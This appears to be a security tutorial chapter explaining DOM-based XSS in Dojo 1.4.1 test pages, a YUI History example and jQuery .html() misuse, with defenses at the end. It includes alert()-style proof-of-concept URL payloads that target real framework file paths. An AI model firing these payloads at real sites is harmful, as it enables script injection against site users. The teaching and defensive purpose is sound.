# 16 - DOM XSS in JavaScript Frameworks: Dojo, YUI, and jQuery

## The Pattern

Popular JavaScript frameworks and their test/demo pages often read from `window.location` (query string, hash) and write the values into the DOM via `document.write()` or `innerHTML` without sanitization. These are DOM-based XSS vulnerabilities — the server never sees the payload.

## Dojo Toolkit (1.4.1)

### Vulnerability 1: `_testCommon.js` — Theme Parameter Injection

File: `dijit/tests/_testCommon.js`

```javascript
// Line 25: extract query string
var str = window.location.href.substr(window.location.href.indexOf("?") + 1).split(/#/);

// Line 54: inject theme CSS via document.write
var themeCss = d.moduleUrl("dijit.themes", theme + "/" + theme + ".css");
var themeCssRtl = d.moduleUrl("dijit.themes", theme + "/" + theme + "_rtl.css");
document.write('<link rel="stylesheet" type="text/css" href="' + themeCss + '">');
document.write('<link rel="stylesheet" type="text/css" href="' + themeCssRtl + '">');
```

The `theme` parameter comes from the URL query string and is concatenated directly into `document.write()`. Breaking out of the `href` attribute:

```
http://WebApp/dijit/tests/form/test_Button.html?theme="/><script>alert(/xss/)</script>
```

Result:

```html
<link rel="stylesheet" type="text/css" href=""/><script>alert(/xss/)</script>/.css">
```

The `"/>` closes the `<link>` tag, and the `<script>` executes.

### Vulnerability 2: `runner.html` — Script URL Injection

File: `util/doh/runner.html`

```javascript
// Line 40: read query string
var qstr = window.location.search.substr(1);

// Line 64: inject script tags via document.write
document.write("<scr" + "ipt type='text/javascript' djConfig='isDebug: true' src='" + dojoUrl + "'></scr" + "ipt>");
document.write("<scr" + "ipt type='text/javascript' src='" + testUrl + ".js'></scr" + "ipt>");
```

The `dojoUrl` parameter is read from the query string and written into a `<script src>` attribute. The string splitting (`"<scr"+"ipt"`) is meant to prevent the HTML parser from prematurely closing a surrounding script block — it's not a security measure.

```
http://WebApp/util/doh/runner.html?dojoUrl='/><script>alert(/xss/)</script><'
```

The `'/>` closes the original script tag, and the injected `<script>` executes.

## YUI — History Manager Hash Injection

File: `yui/examples/history/history-navbar_source.html`

The YUI History Manager reads `location.hash` to restore application state and writes it into the DOM:

```javascript
html = '<html><body><div id="state">' + fqstate + '</div></body></html>';
```

`fqstate` comes from the URL fragment. The attacker injects HTML via the hash:

```
http://developer.yahoo.com/yui/examples/history/history-navbar_source.html#navbar=home<script>alert(1)</script>
```

The fragment value is concatenated into an HTML string without encoding. Since the hash (`#`) is never sent to the server, this is purely client-side — server-side WAFs and filters never see the payload.

## jQuery — `html()` Injection

jQuery's `.html()` method parses its argument as HTML and inserts it into the DOM:

```javascript
$('div.demo-container').html("<img src=# onerror=alert(1) />");
```

If the argument to `.html()` contains user-controlled data, it's equivalent to `innerHTML` — any HTML tags and event handlers are parsed and executed. The `<img onerror>` fires immediately because `src=#` fails to load.

This is not a vulnerability in jQuery itself — it's a misuse pattern. But it's extremely common because developers treat `.html()` like `.text()` without realizing it parses HTML.

## Common Thread

All of these follow the same pattern:

```
URL (query string or hash)
       │
       ▼
JavaScript reads the value (location.search, location.hash)
       │
       ▼
Value is concatenated into an HTML string
       │
       ▼
String is written to DOM (document.write, innerHTML, .html())
       │
       ▼
Browser parses injected tags → XSS
```

## Why Framework Code Is Especially Risky

- Test and demo pages ship with the framework and get deployed to production by accident
- Developers trust framework code and don't audit it for XSS
- These files are at predictable paths (`/dijit/tests/...`, `/util/doh/...`) making them easy to discover
- The vulnerabilities are in client-side code, so server-side security measures don't help

## Defenses

- Remove test and demo files from production deployments
- Never use `document.write()`, `innerHTML`, or `.html()` with URL-derived data
- Use safe DOM APIs: `textContent`, `setAttribute()`, `createElement()`
- For jQuery, use `.text()` instead of `.html()` when inserting user data
- Content Security Policy — `script-src` without `'unsafe-inline'` blocks injected script tags
- Audit third-party framework files, not just your own application code
